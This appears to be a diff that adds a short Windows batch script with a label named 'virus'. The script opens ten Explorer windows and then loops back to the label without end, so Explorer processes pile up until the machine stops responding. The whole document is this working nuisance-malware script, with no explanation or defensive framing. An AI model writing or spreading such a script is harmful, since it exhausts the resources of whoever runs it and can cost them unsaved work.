@@ -1,0 +1,13 @@
+@echo off
+: virus
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+start explorer
+goto virus
